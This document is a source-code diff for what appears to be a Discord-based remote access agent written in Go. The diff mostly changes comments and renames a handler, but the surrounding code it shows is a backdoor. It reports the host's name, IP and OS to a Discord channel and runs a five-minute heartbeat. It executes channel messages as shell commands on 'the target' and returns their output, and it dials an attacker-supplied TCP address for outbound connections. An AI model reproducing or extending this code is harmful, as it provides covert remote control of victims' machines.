@@ -21,7 +21,7 @@ import (
 var newAgent *agent.Agent
 var channelID *discordgo.Channel
 
-// Create an Agent
+// Create an Agent with all the necessary information
 func init() {
 
 	newAgent = &agent.Agent{}
@@ -60,21 +60,19 @@ func main() {
 	sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
 	message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
 	dg.ChannelMessagePin(channelID.ID, message.ID)
-	dg.AddHandler(guimessageCreater)
+	dg.AddHandler(messageCreater)
 
 	go func(dg *discordgo.Session) {
 		ticker := time.NewTicker(time.Duration(5) * time.Minute)
 		for {
 			<-ticker.C
 			go heartBeat(dg)
-			// ticker.Reset((time.Duration(5) * time.Minute))
 		}
 	}(dg)
 
 	// Open a websocket connection to Discord and begin listening.
 	err = dg.Open()
 	if err != nil {
-		// fmt.Println("error opening connection,", err)
 		return
 	}
 
@@ -94,7 +92,8 @@ func main() {
 
 }
 
-func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
+// This function is where we define custom commands for discordgo and system commands for the target
+func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 	if !message.Author.Bot {
 		if message.ChannelID == channelID.ID {
 			if message.Content == "ping" {
@@ -116,7 +115,6 @@ func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) 
 						hhh := splitCommand[2] + ":" + splitCommand[3]
 						conn, _ := net.Dial("tcp", hhh)
 						if conn == nil {
-							// println("please don't crash")
 							return
 						}
 
@@ -167,7 +165,7 @@ func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) 
 				output := executeCommand(message.Content)
 				if output == "" {
 					dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
-				} else if len(output) > 2000 {
+				} else if len(output) > 2000 { // TODO Still doesn't output everything
 					firsthalf := output[:1900]
 					otherhalf := output[1900:]
 					dg.ChannelMessageSend(message.ChannelID, "```"+firsthalf+"```")
@@ -226,7 +224,6 @@ func executeCommand(command string) string {
 		}
 
 	} else {
-		// output, err := exec.Command(shell, flag, command, args).Output()
 		output, err := exec.Command(shell, flag, testcmd).Output()
 		if err != nil {
 			// maybe send error to server
